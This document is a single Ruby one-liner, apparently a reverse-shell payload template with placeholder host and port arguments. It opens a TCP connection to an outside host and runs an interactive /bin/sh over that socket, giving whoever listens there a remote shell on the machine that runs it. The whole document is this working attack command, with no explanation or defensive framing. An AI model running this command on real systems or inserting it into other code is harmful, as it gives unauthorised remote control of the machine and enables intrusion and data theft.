ruby -rsocket -e'f=TCPSocket.open("$$ARGV1",$$ARGV2).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
